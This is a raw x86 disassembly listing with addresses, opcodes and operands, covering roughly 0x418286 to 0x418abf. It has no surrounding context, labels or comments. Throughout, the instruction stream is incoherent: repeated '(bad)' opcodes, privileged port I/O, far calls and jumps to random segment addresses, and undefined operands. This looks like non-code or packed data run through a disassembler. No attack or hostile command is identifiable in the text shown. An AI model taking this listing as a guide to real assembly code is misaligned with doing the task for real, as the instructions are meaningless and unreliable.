  418286:	in     eax,0xfd
  418288:	dec    edx
  418289:	outs   dx,BYTE PTR ds:[esi]
  41828a:	sub    edi,ecx
  41828c:	and    ah,BYTE PTR [eax+0x11]
  41828f:	pop    eax
  418290:	jnp    0x4182f6
  418292:	popf   
  418293:	mov    al,ds:0x9e1f9507
  418298:	jmp    0x418254
  41829a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41829b:	leave  
  41829c:	mov    eax,0x3995a793
  4182a1:	xchg   esi,eax
  4182a2:	dec    ebx
  4182a3:	aaa    
  4182a4:	sbb    al,BYTE PTR [esi+0x3f]
  4182a7:	std    
  4182a8:	dec    ebx
  4182a9:	and    BYTE PTR [ebx+0x2e],ah
  4182ac:	jmp    0x4182f4
  4182ae:	sub    edx,ebx
  4182b0:	int3   
  4182b1:	(bad)
  4182b5:	stc    
  4182b6:	or     edi,edi
  4182b8:	add    al,0xdc
  4182ba:	dec    ecx
  4182bb:	xchg   esp,eax
  4182bc:	hlt    
  4182bd:	xchg   DWORD PTR [edi-0x61],ebx
  4182c0:	scas   eax,DWORD PTR es:[edi]
  4182c1:	(bad)  
  4182c2:	adc    DWORD PTR [eax+0x4f],eax
  4182c5:	(bad)  
  4182c6:	nop
  4182c7:	mov    ebp,0x4533ec4d
  4182cc:	mov    ebx,0xae7ab56e
  4182d1:	scas   eax,DWORD PTR es:[edi]
  4182d2:	sbb    BYTE PTR [ecx],cl
  4182d4:	xchg   edx,eax
  4182d5:	sub    dh,BYTE PTR [edx-0x31]
  4182d8:	add    DWORD PTR [edi],ebx
  4182da:	lods   eax,DWORD PTR ds:[esi]
  4182db:	jae    0x418354
  4182dd:	aam    0xae
  4182df:	dec    ebp
  4182e0:	add    DWORD PTR [ecx+0x3290a128],esi
  4182e6:	push   ecx
  4182e7:	jecxz  0x41833f
  4182e9:	call   0xafbf:0x155c4277
  4182f0:	test   eax,0xeed315f7
  4182f5:	pop    ecx
  4182f6:	xor    bl,cl
  4182f8:	stc    
  4182f9:	pushf  
  4182fa:	lock or esp,DWORD PTR [eax-0x18441865]
  418301:	mov    ds:0x96ed4bed,eax
  418306:	ret    
  418307:	xchg   DWORD PTR es:[esi],eax
  41830a:	bound  ebp,QWORD PTR [edi+0x3a8ab5b8]
  418310:	fisubr WORD PTR [eax]
  418312:	fldcw  WORD PTR [ebx+ebp*4-0x7072f548]
  418319:	jo     0x4182de
  41831b:	inc    ebx
  41831c:	push   esp
  41831d:	or     al,0xbf
  41831f:	stos   DWORD PTR es:[edi],eax
  418320:	add    BYTE PTR [ecx-0x6f111a1e],dh
  418326:	call   0xabf:0xe7022201
  41832d:	xchg   DWORD PTR [esi+eiz*1-0x29c92a75],esi
  418334:	mov    al,BYTE PTR [eax+0x7b]
  418337:	jp     0x4182cb
  418339:	mov    WORD PTR [edi+ebp*8+0x29],gs
  41833d:	fisub  DWORD PTR [ecx-0xc932fb7]
  418343:	in     al,0x8
  418345:	add    al,0x23
  418347:	or     DWORD PTR [ecx+0x32f8db9c],0xffffffdb
  41834e:	mov    bl,0xc7
  418350:	enter  0xcae4,0xe0
  418354:	push   ecx
  418355:	or     BYTE PTR [ebx+0x2774c8d2],bl
  41835b:	out    dx,eax
  41835c:	xor    eax,0xa0097236
  418361:	mov    bl,0x32
  418363:	pop    ebp
  418364:	das    
  418365:	xchg   edi,eax
  418366:	add    eax,0xdba52e4d
  41836b:	sbb    bh,ch
  41836d:	leave  
  41836e:	mov    WORD PTR [edi+0x2a81e19a],ss
  418374:	push   esp
  418375:	pop    edi
  418376:	(bad)  
  418377:	(bad)  
  418378:	xor    dl,BYTE PTR [edx-0x2c]
  41837b:	dec    ebp
  41837c:	jp     0x4183b7
  41837e:	nop
  41837f:	(bad)  
  418380:	aam    0xef
  418382:	xor    dl,dh
  418384:	mov    bh,0x23
  418386:	cdq    
  418387:	in     eax,dx
  418388:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41838a:	sbb    BYTE PTR [ecx-0x3c5280bd],0x16
  418391:	jnp    0x41836b
  418393:	hlt    
  418394:	mov    esi,0x4c99812e
  418399:	push   ds
  41839a:	aas    
  41839b:	ja     0x4183f0
  41839d:	push   ds
  41839e:	daa    
  41839f:	arpl   si,di
  4183a1:	inc    ebp
  4183a2:	aaa    
  4183a3:	arpl   sp,ax
  4183a5:	test   al,0x86
  4183a7:	xchg   BYTE PTR [ebx],bh
  4183a9:	mov    al,ds:0x96161c2a
  4183ae:	aaa    
  4183af:	(bad)
  4183b2:	inc    eax
  4183b3:	stos   DWORD PTR es:[edi],eax
  4183b4:	cmc    
  4183b5:	ror    DWORD PTR ds:0x7eda92a6,cl
  4183bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183bc:	cli    
  4183bd:	sbb    eax,0x9b3324aa
  4183c2:	mov    ebp,0x41c2de8b
  4183c7:	mov    ds:0x7d12e718,al
  4183cc:	cmp    dh,BYTE PTR [esi]
  4183ce:	pop    ebx
  4183cf:	mov    ebp,fs
  4183d1:	shr    BYTE PTR [ebx-0x1073f392],1
  4183d7:	inc    ecx
  4183d8:	lods   al,BYTE PTR ds:[esi]
  4183d9:	mov    edx,ss
  4183db:	jnp    0x418452
  4183dd:	cmc    
  4183de:	loop   0x4183b7
  4183e0:	cli    
  4183e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183e2:	mov    bh,0xcb
  4183e4:	jl     0x418439
  4183e6:	sub    al,bl
  4183e8:	and    dl,ah
  4183ea:	imul   edi,DWORD PTR [eax-0x14],0x4d
  4183ee:	je     0x4183ad
  4183f0:	fs loopne 0x418462
  4183f3:	jnp    0x418379
  4183f5:	pop    edi
  4183f6:	scas   al,BYTE PTR es:[edi]
  4183f7:	inc    edi
  4183f8:	gs repz jge 0x418424
  4183fc:	mov    ah,0x2d
  4183fe:	call   0x437c3973
  418403:	(bad)
  418406:	pop    es
  418407:	lods   al,BYTE PTR ds:[esi]
  418408:	retf   
  418409:	fdiv   DWORD PTR [edi+0x21181b22]
  41840f:	sbb    al,0xcd
  418411:	sub    eax,0x147a4b23
  418416:	adc    ch,bh
  418418:	cmp    BYTE PTR [esi+ebp*1+0x707f72a8],0xef
  418420:	test   BYTE PTR [ecx+edx*1],bl
  418423:	sbb    al,0x55
  418425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418426:	fsubr  QWORD PTR [ecx-0x31]
  418429:	div    DWORD PTR [eax]
  41842b:	adc    al,0x61
  41842d:	xor    DWORD PTR [ebp-0x5c6b6a22],edx
  418433:	sub    esi,edi
  418435:	mov    esi,0x1d321cf4
  41843a:	cmc    
  41843b:	clc    
  41843c:	adc    BYTE PTR [ebx-0x43],0x96
  418440:	les    ebx,FWORD PTR [edi-0x25]
  418443:	fcmove st,st(7)
  418445:	xor    BYTE PTR [eax+eiz*2+0x16],bh
  418449:	mov    ebp,0xdccb1001
  41844e:	cli    
  41844f:	imul   ebx,DWORD PTR [ebx],0x34
  418452:	adc    DWORD PTR [eax],ebp
  418454:	adc    DWORD PTR [edx-0x36e36238],edi
  41845a:	and    al,0x38
  41845c:	mov    ecx,esi
  41845e:	xor    edx,DWORD PTR [ecx+0x2b]
  418461:	mov    dl,0x0
  418463:	or     eax,0x37742d80
  418468:	jl     0x4184b9
  41846a:	lds    eax,FWORD PTR [eax+0x2dfc9f27]
  418470:	dec    esi
  418471:	idiv   DWORD PTR [edx-0x73]
  418474:	xor    al,0xf0
  418476:	adc    BYTE PTR [ebx+0x38a824f6],dh
  41847c:	push   edx
  41847d:	addr16 jnp 0x418447
  418480:	fwait
  418481:	inc    eax
  418482:	rcr    BYTE PTR [esi+0x37a6cbf4],1
  418488:	pop    ebx
  418489:	into   
  41848a:	push   esi
  41848b:	daa    
  41848c:	in     al,dx
  41848d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41848e:	adc    eax,0xac34f0db
  418493:	loop   0x418442
  418495:	aam    0x5
  418497:	dec    edx
  418498:	adc    al,0x5f
	...
  418512:	add    BYTE PTR [eax],al
  418514:	push   edi
  418515:	lea    esp,[ecx+0x7e]
  418518:	sti    
  418519:	(bad)  
  41851a:	pop    edi
  41851b:	lods   eax,DWORD PTR ds:[esi]
  41851c:	into   
  41851d:	fisttp DWORD PTR [edx+0x58]
  418520:	jg     0x418540
  418522:	dec    edi
  418523:	push   ebp
  418524:	popa   
  418525:	daa    
  418526:	add    DWORD PTR [eax],eax
  418528:	outs   dx,BYTE PTR ds:[esi]
  418529:	pop    es
  41852a:	add    BYTE PTR [eax],al
  41852c:	les    edi,FWORD PTR [ebp*4-0x6936d5ac]
  418533:	sub    BYTE PTR [esi],0xed
  418536:	mov    ecx,0x4c4b1754
  41853b:	mov    al,ds:0x558b1015
  418540:	push   ss
  418541:	cmp    DWORD PTR [ebx+0x57b16278],esp
  418547:	int3   
  418548:	and    DWORD PTR [ebx],edi
  41854a:	sbb    ecx,DWORD PTR [esi]
  41854c:	fadd   DWORD PTR [ecx-0x4]
  41854f:	lock pop edx
  418551:	dec    edx
  418552:	(bad)  
  418553:	mov    es,WORD PTR [ebx]
  418555:	daa    
  418556:	daa    
  418557:	mov    bh,0xe4
  418559:	sbb    dl,al
  41855b:	icebp  
  41855c:	jg     0x4184fa
  41855e:	lods   al,BYTE PTR ds:[esi]
  41855f:	pop    esi
  418560:	in     eax,dx
  418561:	aaa    
  418562:	pop    edx
  418563:	bound  ebx,QWORD PTR [esi]
  418565:	retf   0xc921
  418568:	retf   0x16c0
  41856b:	dec    ebp
  41856c:	loop   0x4185e9
  41856e:	mov    ebx,0x8edf203b
  418573:	adc    eax,0xca3d0362
  418578:	jmp    0x9414ff72
  41857d:	out    0x91,eax
  41857f:	jmp    0x3642bed
  418584:	out    dx,al
  418585:	mov    es,WORD PTR [ecx-0x63]
  418588:	shl    DWORD PTR [ebx-0x53],0x58
  41858c:	pop    edi
  41858d:	test   DWORD PTR [edx-0x266bf2f4],esp
  418593:	out    dx,al
  418594:	lods   eax,DWORD PTR ds:[esi]
  418595:	sub    al,0x1e
  418597:	call   0xba276b4a
  41859c:	adc    BYTE PTR [ecx+eiz*4],bl
  41859f:	xchg   edx,eax
  4185a0:	xchg   ecx,eax
  4185a1:	inc    ebx
  4185a2:	ror    DWORD PTR [ebx],0x61
  4185a5:	sbb    ah,BYTE PTR es:[eax]
  4185a8:	and    eax,0xde6e0319
  4185ad:	xor    al,0x2a
  4185af:	out    dx,eax
  4185b0:	ja     0x418593
  4185b2:	int    0x46
  4185b4:	xor    eax,0x5a5e2db0
  4185b9:	call   0x7322:0x1c6a34d9
  4185c0:	sti    
  4185c1:	mov    esi,0xad30d14e
  4185c6:	jns    0x418610
  4185c8:	pop    es
  4185c9:	or     esi,DWORD PTR [esp+eiz*8]
  4185cc:	or     esi,ebx
  4185ce:	sbb    ebp,eax
  4185d0:	mov    eax,0x8ad99cfa
  4185d5:	jne    0x4185e3
  4185d7:	ret    0x8755
  4185da:	enter  0xcb7f,0x89
  4185de:	loope  0x41863a
  4185e0:	adc    eax,0xf4c9e728
  4185e5:	daa    
  4185e6:	fisttp DWORD PTR [edi]
  4185e8:	mov    dh,0x36
  4185ea:	outs   dx,BYTE PTR ds:[esi]
  4185eb:	and    BYTE PTR [eax+0x169cd50d],dl
  4185f1:	pop    eax
  4185f2:	fld    DWORD PTR [eax+ebp*1+0x256eb90c]
  4185f9:	(bad)  
  4185fa:	iret   
  4185fb:	xchg   edx,eax
  4185fc:	dec    ebp
  4185fd:	imul   ebp,DWORD PTR [edi],0xba0340cc
  418603:	out    dx,eax
  418604:	pop    ecx
  418605:	dec    ecx
  418606:	mov    al,0x97
  418608:	push   edx
  418609:	jge    0x41867f
  41860b:	ja     0x41866d
  41860d:	loope  0x418615
  41860f:	int    0x3
  418611:	fistp  QWORD PTR [esi-0x7d]
  418614:	jb     0x4185f0
  418616:	adc    eax,0xc3ad2823
  41861b:	mov    bh,BYTE PTR [ebp-0x4422b9f2]
  418621:	push   esi
  418622:	adc    DWORD PTR [eax+ebp*1-0x44],ebx
  418626:	mov    cl,0x58
  418628:	mov    ebp,0xff6422ab
  41862d:	push   cs
  41862e:	push   0x74
  418630:	pop    ds
  418631:	addr16 ret 0xd12c
  418635:	leave  
  418636:	pop    ds
  418637:	loope  0x4185d5
  418639:	enter  0x45a4,0x5a
  41863d:	shrd   DWORD PTR [edx],esp,cl
  418640:	fwait
  418641:	lock mov cl,0x5f
  418644:	sbb    eax,0xc0e9ee89
  418649:	fwait
  41864a:	test   DWORD PTR [eax],0x540d8620
  418650:	aam    0x3b
  418652:	adc    DWORD PTR [edx-0x4fd14ca7],ecx
  418658:	jmp    0xabbcb29e
  41865d:	nop
  41865e:	add    BYTE PTR [esp+ebx*2+0x397bdcaa],al
  418665:	repz popa 
  418667:	test   DWORD PTR [ebp+0x59],edi
  41866a:	test   DWORD PTR [ebx],0xc61ccfc
  418670:	in     al,0x65
  418672:	inc    esp
  418673:	or     eax,0x3fb7abfd
  418678:	add    BYTE PTR [ebx],bh
  41867a:	push   ds
  41867b:	imul   edx,DWORD PTR ds:0x1220cbb0,0xfffffff8
  418682:	shr    DWORD PTR ds:0x9887251,0xc8
  418689:	ret    0x2c62
  41868c:	hlt    
  41868d:	bound  edx,QWORD PTR [esi]
  41868f:	stos   DWORD PTR es:[edi],eax
  418690:	test   DWORD PTR [edi-0x296e93fa],edi
  418696:	scas   eax,DWORD PTR es:[edi]
  418697:	cld    
  418698:	xchg   edi,eax
  418699:	dec    edx
  41869a:	iret   
  41869b:	sahf   
  41869c:	loope  0x41870d
  41869e:	xchg   ecx,eax
  41869f:	mov    edx,0x73538a69
  4186a4:	jno    0x4186a3
  4186a6:	push   es
  4186a7:	dec    ebx
  4186a8:	push   ss
  4186a9:	pushf  
  4186aa:	mov    fs,esi
  4186ac:	ror    DWORD PTR [ecx+0x20],0x52
  4186b0:	scas   al,BYTE PTR es:[edi]
  4186b1:	stos   DWORD PTR es:[edi],eax
  4186b2:	inc    ebx
  4186b3:	mov    DWORD PTR [edi-0x5c],edi
  4186b6:	xchg   esi,eax
  4186b7:	ss out dx,eax
  4186b9:	cld    
  4186ba:	pop    esp
  4186bb:	mov    ecx,0x5590e4ac
  4186c0:	jecxz  0x418692
  4186c2:	retf   
  4186c3:	inc    eax
  4186c4:	xor    bl,BYTE PTR [ebx+0x79]
  4186c7:	in     eax,dx
  4186c8:	fidiv  WORD PTR [ebp+0x4ab0ddb]
  4186ce:	sub    al,0x14
  4186d0:	jmp    0x7b71:0xef9f9a99
  4186d7:	sahf   
  4186d8:	cli    
  4186d9:	clc    
  4186da:	sahf   
  4186db:	pop    ds
  4186dc:	pop    es
  4186dd:	or     al,bh
  4186df:	cmp    eax,0x5e4f0581
  4186e4:	stos   BYTE PTR es:[edi],al
  4186e5:	aad    0xa7
  4186e7:	cmp    DWORD PTR cs:[ecx-0x7b],ecx
  4186eb:	rcl    DWORD PTR [ebp+0x4d],cl
  4186ee:	add    DWORD PTR [eax+ebp*4],esp
  4186f1:	cmp    BYTE PTR [edi],ah
  4186f3:	retf   
  4186f4:	mov    dh,0xb8
  4186f6:	push   edx
  4186f7:	sub    DWORD PTR [edi+0x76a5165e],edi
  4186fd:	add    eax,0xfc8cb438
  418702:	push   ebp
  418703:	(bad)  
  418704:	xchg   ebp,eax
  418705:	cmp    al,0x5b
  418707:	sub    al,0x5
  418709:	mov    al,0x2e
  41870b:	xor    al,0x0
  41870d:	(bad)  
  41870e:	inc    edi
  41870f:	xor    ah,BYTE PTR [edi+edx*2+0x25]
  418713:	sub    eax,0x8b0b9d38
  418718:	fisttp QWORD PTR [ecx-0x50faddc7]
  41871e:	push   es
  41871f:	jo     0x418793
  418721:	dec    ebx
  418722:	nop
  418723:	dec    eax
  418724:	sbb    BYTE PTR [ecx-0x62],cl
  418727:	iret   
  418728:	push   edx
  418729:	scas   al,BYTE PTR es:[edi]
  41872a:	adc    esi,DWORD PTR [eax]
  41872c:	sub    DWORD PTR [eax-0x46],ecx
  41872f:	jmp    0x8255:0x3b884f3a
  418736:	and    BYTE PTR [edx+eiz*8+0x75],dl
  41873a:	popf   
  41873b:	cmp    BYTE PTR [ebx+0x1f],dl
  41873e:	stc    
  41873f:	inc    edx
  418740:	loope  0x41879e
  418742:	xchg   edi,eax
  418743:	out    dx,eax
  418744:	loope  0x418761
  418746:	test   DWORD PTR [edx+0x2f65f7e6],edx
  41874c:	outs   dx,DWORD PTR ds:[esi]
  41874d:	das    
  41874e:	push   cs
  41874f:	out    0xa0,eax
  418751:	push   0x10
  418753:	cmp    al,0x2
  418755:	sbb    ebx,ecx
  418757:	loope  0x4187c8
  418759:	pop    ebx
  41875a:	in     eax,dx
  41875b:	sti    
  41875c:	pop    ebp
  41875d:	push   ss
  41875e:	(bad)  
  41875f:	lea    esp,[esi-0x15]
  418762:	cmc    
  418763:	mov    ebx,0x32bb78ad
  418768:	out    dx,al
  418769:	cdq    
  41876a:	add    eax,DWORD PTR [edx-0x25]
  41876d:	push   esi
  41876e:	out    dx,eax
  41876f:	bound  ebx,QWORD PTR [ebx+ebx*4+0x58]
  418773:	in     eax,0xcb
  418775:	(bad)  
  418776:	cdq    
  418777:	fdivr  DWORD PTR [ecx-0x6b]
  41877a:	stc    
  41877b:	lock xchg ebx,eax
  41877d:	ins    DWORD PTR es:[edi],dx
  41877e:	aam    0xc0
  418780:	cmp    ch,ch
  418782:	dec    esp
  418783:	fwait
  418784:	ss xchg ebx,eax
  418786:	clc    
  418787:	pop    ss
  418788:	xor    BYTE PTR [edx+0x4386828a],dh
  41878e:	jne    0x418780
  418790:	mov    WORD PTR [edi+0x7a],?
  418793:	mov    bh,0x7c
  418795:	xor    al,0x85
  418797:	pop    ebp
  418798:	add    DWORD PTR [ebx],edx
  41879a:	mov    edx,DWORD PTR [esi]
  41879c:	inc    ecx
  41879d:	dec    edi
  41879e:	xor    al,BYTE PTR [edi+0x1bb2164]
  4187a4:	cmp    bl,0xe7
  4187a7:	jnp    0x4187fc
  4187a9:	mov    esi,0x23b12a09
  4187ae:	loopne 0x41875c
  4187b0:	xor    BYTE PTR [edx],bl
  4187b2:	lea    esi,[eax]
  4187b4:	jge    0x41882b
  4187b6:	and    eax,0xc3e7c18f
  4187bb:	ret    0x2feb
  4187be:	xchg   esi,eax
  4187bf:	icebp  
  4187c0:	xchg   esp,eax
  4187c1:	lock inc esp
  4187c3:	adc    eax,0x22ae874d
  4187c8:	call   0xc2b4:0xd07ebec7
  4187cf:	adc    eax,0xd43b9559
  4187d4:	dec    eax
  4187d5:	cmc    
  4187d6:	test   al,0xc6
  4187d8:	inc    ebx
  4187d9:	out    dx,eax
  4187da:	sub    BYTE PTR [ebp+0x7e029b7a],ah
  4187e0:	xor    DWORD PTR [esi+0x701d2f34],ebp
  4187e6:	and    cl,BYTE PTR [edx+0x7337791f]
  4187ec:	ret    
  4187ed:	inc    eax
  4187ee:	scas   eax,DWORD PTR es:[edi]
  4187ef:	mov    eax,0x6c3683bf
  4187f4:	je     0x418778
  4187f6:	jmp    0x418817
  4187f8:	or     DWORD PTR ds:0x90083693,eax
  4187fe:	pop    esp
  4187ff:	repz adc cl,BYTE PTR fs:[ebp-0x41]
  418804:	pop    DWORD PTR [ebx+0x754d9bfe]
  41880a:	lods   eax,DWORD PTR ds:[esi]
  41880b:	int3   
  41880c:	les    esi,FWORD PTR [ecx+0x4f42b59c]
  418812:	pop    ds
  418813:	stos   DWORD PTR es:[edi],eax
  418814:	add    ah,BYTE PTR [ebp-0x421e96ed]
  41881a:	pop    esp
  41881b:	mov    bl,0x81
  41881d:	xchg   esp,eax
  41881e:	sub    ebp,DWORD PTR [ecx+0x102fe9a6]
  418824:	sbb    al,0x72
  418826:	and    bl,al
  418828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418829:	(bad)  
  41882a:	in     al,0x2c
  41882c:	jne    0x418837
  41882e:	out    dx,al
  41882f:	pop    ds
  418830:	out    0x7d,eax
  418832:	pusha  
  418833:	pop    ebx
  418834:	inc    edi
  418835:	push   edi
  418836:	stos   BYTE PTR es:[edi],al
  418837:	sub    BYTE PTR [esi+0x72a68588],0x15
  41883e:	cs mov ebp,0x446eac3c
  418844:	jnp    0x4188ab
  418846:	(bad)  
  418847:	push   ecx
  418848:	add    DWORD PTR [edi-0x1d41e426],ecx
  41884e:	cmp    DWORD PTR [esi],ecx
  418850:	pop    esi
  418851:	mov    eax,ds:0xa2fe5f4b
  418856:	pop    edi
  418857:	xchg   ebx,eax
  418858:	pop    ebx
  418859:	ds out 0x98,eax
  41885c:	push   eax
  41885d:	std    
  41885e:	cmp    eax,DWORD PTR [edx+edx*1+0x73348367]
  418865:	fiadd  WORD PTR [esi+eiz*2+0x12]
  418869:	sub    dl,ch
  41886b:	or     bl,BYTE PTR [eax]
  41886d:	iret   
  41886e:	call   DWORD PTR [eax+0x5836aa9e]
  418874:	push   ecx
  418875:	popf   
  418876:	std    
  418877:	out    dx,eax
  418878:	test   edx,0x2741f89a
  41887e:	in     eax,dx
  41887f:	iret   
  418880:	xchg   edx,eax
  418881:	lahf   
  418882:	push   edx
  418883:	bnd jmpw 0x3430
  418888:	repz in eax,dx
  41888a:	inc    ecx
  41888b:	push   ebx
  41888c:	add    dh,dh
  41888e:	dec    edi
  41888f:	sbb    DWORD PTR [esi],edx
  418891:	inc    eax
  418892:	mov    cr7,edx
  418895:	cdq    
  418896:	jl     0x41887f
  418898:	jnp    0x41883d
  41889a:	mov    al,0x46
  41889c:	dec    edx
  41889d:	imul   ebx,DWORD PTR [ebx*8+0x51d60d8b],0x1a4997df
  4188a8:	inc    ebp
  4188a9:	repz inc DWORD PTR [edx-0x4c13709c]
  4188b0:	pop    eax
  4188b1:	adc    DWORD PTR [ecx],ecx
  4188b3:	dec    esp
  4188b4:	and    ch,ch
  4188b6:	das    
  4188b7:	shr    BYTE PTR [ecx+0x11],1
  4188ba:	test   eax,0xda0c9be
  4188bf:	ret    
  4188c0:	aam    0x62
  4188c2:	xchg   edx,eax
  4188c3:	dec    edi
  4188c4:	add    al,0x8
  4188c6:	pop    esp
  4188c7:	out    dx,eax
  4188c8:	dec    eax
  4188c9:	push   0x23176b00
  4188ce:	in     al,dx
  4188cf:	inc    esp
  4188d0:	clc    
  4188d1:	pop    esi
  4188d2:	cmp    DWORD PTR [edx-0x2d],0x8225a529
  4188d9:	jae    0x41892e
  4188db:	adc    ecx,DWORD PTR [ecx]
  4188dd:	or     al,0xdf
  4188df:	mov    bh,cl
  4188e1:	cmp    dh,cl
  4188e3:	dec    edx
  4188e4:	js     0x418898
  4188e6:	push   edx
  4188e7:	imul   ecx,DWORD PTR [edi-0xc],0x1b2214c6
  4188ee:	inc    ebp
  4188ef:	and    al,0x53
  4188f1:	stos   DWORD PTR es:[edi],eax
  4188f2:	out    dx,eax
  4188f3:	clc    
  4188f4:	les    edx,FWORD PTR [eax+0x504793e0]
  4188fa:	inc    esp
  4188fb:	pop    ecx
  4188fc:	and    BYTE PTR [eax+0x29],bl
  4188ff:	push   edx
  418900:	xor    bh,bl
  418902:	push   cs
  418903:	out    dx,al
  418904:	les    edi,FWORD PTR [ebx+0x6b]
  418907:	mov    dh,0x2a
  418909:	push   edi
  41890a:	in     eax,0x97
  41890c:	push   0x5c5df24e
  418911:	in     eax,dx
  418912:	scas   eax,DWORD PTR es:[edi]
  418913:	es (bad) 
  418917:	adc    ecx,DWORD PTR [ebp+esi*4+0x3f]
  41891b:	imul   ebp,esp,0x6aff84be
  418921:	mov    dl,0xbd
  418923:	mov    ds:0x80b94fa9,al
  418928:	(bad)  
  41892a:	mov    ?,WORD PTR [ecx]
  41892c:	cmc    
  41892d:	ret    0x68f8
  418930:	gs inc ebp
  418932:	shl    ch,cl
  418934:	sub    al,bh
  418936:	adc    eax,0x12b3738a
  41893b:	xchg   esp,eax
  41893c:	adc    DWORD PTR [edx+eax*8+0x57],ecx
  418940:	xchg   BYTE PTR [ecx-0x236cd065],cl
  418946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418947:	mov    dl,0xe9
  418949:	dec    eax
  41894a:	and    esi,edi
  41894c:	scas   al,BYTE PTR es:[edi]
  41894d:	mov    esi,0x92bc7818
  418952:	inc    ebx
  418953:	push   ebp
  418954:	jl     0x4189b3
  418956:	push   ebp
  418957:	hlt    
  418958:	pop    ecx
  418959:	add    DWORD PTR [esi+0x7d],ecx
  41895c:	aaa    
  41895d:	icebp  
  41895e:	xor    al,0xf2
  418960:	xchg   DWORD PTR [eax+0x4f19d384],eax
  418966:	pop    esp
  418967:	push   0xe095da57
  41896c:	mov    ecx,0xf0e163d8
  418971:	cmp    al,0xa5
  418973:	push   esp
  418974:	push   ecx
  418975:	jle    0x4188f7
  418977:	adc    DWORD PTR [ebp+0x6dbe6d3c],0xffffffbf
  41897e:	jmp    0x1477:0x96813e76
  418985:	or     al,0xdf
  418987:	mov    cl,0xe9
  418989:	and    eax,0x25a71c1b
  41898e:	push   ds
  41898f:	adc    BYTE PTR [ecx],bh
  418991:	repz je 0x41896a
  418994:	das    
  418995:	mov    ebx,0x61033aee
  41899a:	into   
  41899b:	dec    esi
  41899c:	bound  eax,QWORD PTR [esi+0x20c0f4a7]
  4189a2:	retf   0x32c7
  4189a5:	sbb    DWORD PTR [ebx],eax
  4189a7:	cwde   
  4189a8:	pop    es
  4189a9:	cdq    
  4189aa:	je     0x418963
  4189ac:	or     edi,0x38
  4189af:	pop    ss
  4189b0:	mov    dh,0xbd
  4189b2:	and    al,0x9e
  4189b4:	leave  
  4189b5:	imul   esi,DWORD PTR [ecx],0xffffffea
  4189b8:	xchg   DWORD PTR [eax-0x1a1d0c29],ebx
  4189be:	pop    esi
  4189bf:	mov    edi,ss
  4189c1:	mov    ecx,0xee9e6881
  4189c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189c7:	sbb    al,0x88
  4189c9:	repz (bad) 
  4189cb:	fild   DWORD PTR [ebx]
  4189cd:	je     0x418971
  4189cf:	jbe    0x4189ef
  4189d1:	ss push edx
  4189d3:	mov    eax,0xfae95244
  4189d8:	int    0x3a
  4189da:	inc    edi
  4189db:	(bad)  
  4189dd:	sub    BYTE PTR [ebp-0x56dc450e],al
  4189e3:	cmp    al,0x92
  4189e5:	adc    DWORD PTR [edi-0x72],0x5edb4d7d
  4189ec:	(bad)  
  4189ed:	sahf   
  4189ee:	adc    al,0x48
  4189f0:	xchg   ecx,eax
  4189f1:	jns    0x418a1f
  4189f3:	nop
  4189f4:	add    al,0xbd
  4189f6:	pop    ebp
  4189f7:	out    dx,ax
  4189f9:	xor    ecx,DWORD PTR ds:0xb94d9ee
  4189ff:	sub    edi,ecx
  418a01:	retf   
  418a02:	push   esi
  418a03:	pop    eax
  418a04:	das    
  418a05:	adc    al,BYTE PTR [eax-0x6ffd9758]
  418a0b:	out    0x62,al
  418a0d:	repz xchg ebx,eax
  418a0f:	fimul  WORD PTR [ebp+0x2eda7503]
  418a15:	cmc    
  418a16:	push   cs
  418a17:	mov    ecx,0x3ce01fdc
  418a1c:	xchg   BYTE PTR [ecx],bh
  418a1e:	cmp    ebx,ebx
  418a20:	mov    al,0x6
  418a22:	mov    bh,0xbe
  418a24:	jp     0x418a6e
  418a26:	mov    WORD PTR [ecx-0xc],?
  418a29:	iret   
  418a2a:	int    0x21
  418a2c:	and    al,0xb4
  418a2e:	imul   edx,DWORD PTR [ecx-0x5a18da6a],0xfffffff2
  418a35:	ins    DWORD PTR es:[edi],dx
  418a36:	test   edi,0xa744265f
  418a3c:	dec    ecx
  418a3d:	xchg   ebx,eax
  418a3e:	push   esi
  418a3f:	pop    ss
  418a40:	sub    edx,DWORD PTR [eax+esi*8]
  418a43:	loop   0x418a91
  418a45:	adc    BYTE PTR [ebp+0x3a],bl
  418a48:	add    al,0x4d
  418a4a:	repnz pusha 
  418a4c:	push   esp
  418a4d:	inc    esi
  418a4e:	pop    edi
  418a4f:	adc    al,0xcf
  418a51:	xchg   esi,eax
  418a52:	xor    BYTE PTR [esi],ah
  418a54:	sahf   
  418a55:	add    al,BYTE PTR [edi+0x3d]
  418a58:	ja     0x418aa3
  418a5a:	rcl    DWORD PTR [edi+edi*1-0x1b],cl
  418a5e:	hlt    
  418a5f:	mov    ds:0x55e6ac4e,eax
  418a64:	es xor eax,0x11d94cbb
  418a6a:	adc    BYTE PTR [ecx-0x3bb485a4],dl
  418a70:	faddp  st(0),st
  418a72:	inc    ebx
  418a73:	into   
  418a74:	call   0x695c:0xf7db7b8a
  418a7b:	in     eax,dx
  418a7c:	pop    ecx
  418a7d:	mov    ebp,0x2e29ee02
  418a82:	push   edi
  418a83:	ins    DWORD PTR es:[edi],dx
  418a84:	mov    bl,0x97
  418a86:	lahf   
  418a87:	(bad)  
  418a88:	cmp    BYTE PTR [ebx-0x21],dh
  418a8b:	loopne 0x418af9
  418a8d:	cli    
  418a8e:	ss mov esp,0x26607720
  418a94:	add    edx,esi
  418a96:	pop    ecx
  418a97:	push   ecx
  418a98:	stc    
  418a99:	jae    0x418abd
  418a9b:	xchg   esi,eax
  418a9c:	xor    cl,BYTE PTR [ebp+0x7d]
  418a9f:	mov    al,0x51
  418aa1:	mov    ebp,0x2f059ed0
  418aa6:	push   edx
  418aa7:	cmc    
  418aa8:	mov    al,0x46
  418aaa:	jg     0x418afc
  418aac:	pop    ebx
  418aad:	fldlg2 
  418aaf:	mov    eax,0x560968d4
  418ab4:	jmp    0x31ed8345
  418ab9:	nop
  418aba:	stos   BYTE PTR es:[edi],al
  418abb:	jne    0x418ad0
  418abd:	dec    ebp
  418abe:	dec    edi
  418abf:	mov    ds:0xdfd98d20,al
